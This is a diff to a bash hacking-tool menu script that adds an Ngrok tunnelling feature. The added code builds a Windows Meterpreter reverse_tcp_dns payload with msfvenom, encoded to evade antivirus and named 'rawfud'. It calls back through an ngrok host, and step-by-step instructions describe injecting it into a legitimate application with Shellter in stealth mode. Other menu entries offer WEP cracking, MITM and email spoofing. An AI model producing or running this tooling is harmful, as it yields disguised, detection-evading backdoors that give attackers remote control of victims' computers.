@@ -107,7 +107,12 @@ function banner
 	echo -e ""$YS" 7"$CE") View Public IP"
 	echo -e ""$YS" 8"$CE") View MAC"
 	echo -e ""$YS" 9"$CE") TOOLS             "$YS"15"$CE") Spoof EMAIL"
-	echo -e ""$YS"10"$CE") Handshake    "
+	if [ -f /root/ngrok ]
+	then
+		echo -e ""$YS"10"$CE") Handshake         "$YS"16"$CE") Ngrok port forward"
+	else
+		echo -e ""$YS"10"$CE") Handshake         "$RS"16"$CE") "$RS"Ngrok"$CE" port forward"
+	fi
 	echo -e ""$YS"11"$CE") Find WPS pin "
 	echo -e ""$YS"12"$CE") WEP hacking  "
 	echo -e ""$YS"13"$CE") MITM         "
@@ -552,7 +557,7 @@ do
 	echo -e ""$YS" 6"$CE") Osrfconsole      "$YS"26"$CE") Zirikatu         "$YS"46"$CE") Lalin"
 	echo -e ""$YS" 7"$CE") Hakku            "$YS"27"$CE") WiFi-autopwner   "$YS"47"$CE") Knockmail"
 	echo -e ""$YS" 8"$CE") Trity            "$YS"28"$CE") Bully            "$YS"48"$CE") BoopSuite"
-	echo -e ""$YS" 9"$CE") Cupp             "$YS"29"$CE") Anonsurf"
+	echo -e ""$YS" 9"$CE") Cupp             "$YS"29"$CE") Anonsurf         "$YS"49"$CE") Ngrok"
 	echo -e ""$YS"10"$CE") Dracnmap         "$YS"30"$CE") Anonym8"
 	echo -e ""$YS"11"$CE") Fern             "$YS"31"$CE") TheFatRat"
 	echo -e ""$YS"12"$CE") Netdiscover      "$YS"32"$CE") Angry IP Scanner"
@@ -1242,6 +1247,20 @@ do
 		chmod +x install.py
 		./install.py
 		cd
+	elif [ "$REIN" = "49" ]
+	then
+		if [ -f /root/ngrok ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			$READAK
+			rm /root/ngrok
+		fi
+		rm -f /root/ngrok.zip
+		cd
+		echo -e "Downloading Ngrok"
+		wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip --output-document=/root/ngrok.zip
+		unzip /root/ngrok.zip
 	elif [ "$REIN" = "back" ]
 	then
 		clear
@@ -4248,6 +4267,148 @@ function main_options
 	if [ "$YORNAA" = "0" ]
 	then
 		exit
+	elif [ "$YORNAA" = "16" ]
+	then
+	while true
+	do
+		clear
+		if [ -f /root/ngrok ]
+		then
+			printf '\033]2;NGROK PORT FORWARD\a'
+			echo -e ""$YS"help"$CE") How to make it work?"
+			echo -e ""$YS" 1"$CE") Open a tcp port"
+			echo -e ""$YS" 2"$CE") Open a tls port"
+			echo -e ""$YS" 3"$CE") Open a http port"
+			echo -e ""$YS" 4"$CE") Intergrate with Shellter"
+			echo -e ""$YS" 5"$CE") Set your ngrok authtoken"
+			echo -e ""$YS"back"$CE") Go back"
+			echo -e "Choose: "
+			read NG
+			clear
+			if [[ "$NG" = "help" || "$NG" = "h" ]]
+			then
+				echo -e "With ngrok, you can port forward without router intergration."
+				echo -e "It is free, HOWEVER:"
+				echo -e "---to open a tcp port, you need to sign up (it's too easy)"
+				echo -e "   Go to https://ngrok.com and choose "$YS"sign up"$CE"."
+				echo -e "   When that's done, copy the given "$YS"authtoken"$CE"."
+				echo -e "   (If you can't find it go to: https://dashboard.ngrok.com/auth )"
+				echo -e "   Then select the 'set your authtoken' option in lscript, and paste it."
+				echo -e "---to make a reverse tcp payload:"
+				echo -e "   You need to set the payload to: windows/meterpreter/reverse_tcp_dns"
+				echo -e "$PAKTGB"
+				$READAK
+			elif [[ $NG = 1 || $NG = 2 || $NG = 3 ]]
+			then
+				echo -e "Type the local port to forward: "
+				read PORTL
+				if [[ $NG = 1 ]]
+				then
+					PROT="tcp"
+				elif [[ $NG = 2 ]]
+				then
+					PROT="tls"
+				else
+					PROT="http"
+				fi
+				export PORTL
+				export PROT
+				xterm -geometry 85x15+9999+999999 -e bash -c './ngrok $PROT $PORTL; exec bash' & disown
+			elif [[ $NG = 4 ]]
+			then
+				while true
+				do
+					clear
+					echo -e ""$YS" 1"$CE") Make a raw tcp payload for Shellter"
+					echo -e ""$YS" 2"$CE") How to intergrate it"
+					echo -e ""$YS"back"$CE") Go back"
+					echo -e "Choose:"
+					read SHINT
+					clear
+					if [[ $SHINT = 1 ]]
+					then
+						while true
+						do
+							if [[ $NGPORT = "" ]]
+							then
+								NGPORT="\e[1;31mNONE\e[0m"
+							fi
+							clear
+							echo -e ""$YS" 1"$CE") Set the Ngrok tcp port              CURRENT:"$NGPORT""
+							#~ echo -e ""$YS" 2"$CE") Set your local tcp port             CURRENT:"$LPORT""
+							echo -e ""$YS"back"$CE") Go back"
+							echo -e ""$YS" run"$CE") Make the payload"
+							echo -e "Choose: "
+							read RP
+							if [[ $RP = 1 ]]
+							then
+								echo -e "Ngrok port: "
+								read NGPORT
+							elif [[ $RP = "back" ]]
+							then
+								break
+							elif [[ $RP = "run" ]]
+							then
+								RAW=rawfud
+								NUMB=1
+								while true
+								do
+									RAWN=""$RAW""$NUMB""
+									if [ -f /root/Desktop/"$RAWN".raw ]
+									then
+										NUMB=$((NUMB+1))
+									else
+										break
+									fi
+								done
+								msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=0.tcp.ngrok.io LPORT=$NGPORT -e x86/shikata_ga_nai -i 15 -f raw -o /root/Desktop/"$RAWN".raw
+								sleep 2
+								if [ -f /root/Desktop/"$RAWN".raw ]
+								then
+									clear
+									echo -e "Payload was saved to /root/Desktop/"$RAWN".raw"
+								fi
+								echo -e "$PAKTGB"
+								$READAK
+							fi
+						done
+					elif [[ $SHINT = 2 ]]
+					then
+						echo -e "First you should make a raw payload with option 1."
+						echo -e "Then open shellter and select your app to be injected."
+						echo -e "Then, on stealth mode select y."
+						echo -e "Select to type a custom payload, NOT listed."
+						echo -e "Then type the path of the payload you have created on option 1."
+						echo -e "For the listener, the payload is windows/meterpreter/reverse_tcp_dns"
+						echo -e "LHOST is 127.0.0.1 and LPORT is the port you opened to ngrok."
+						echo -e "$PAKTGB"
+						$READAK
+					elif [[ $SHINT = "back" ]]
+					then
+						break
+					fi
+				done
+			elif [[ $NG = "back" ]]
+			then
+				clear
+				break
+			elif [[ $NG = 5 ]]
+			then
+					echo -e "Type your authtoken: "
+					read AUTHT
+					if [ $AUTHT != "" ]
+					then
+						./ngrok authtoken $AUTHT
+						echo -e "$PAKTGB"
+						$READAK
+					fi
+			fi
+		else
+			echo -e ""$RS"Ngrok is not installed.To install it, go to TOOLS -> Install/reinstall a tool -> ngrok"$CE""
+			echo -e "$PAKTGB"
+			$READAK
+		fi
+	done
 	elif [ "$YORNAA" = "donate" ]
 	then
 		donate_option
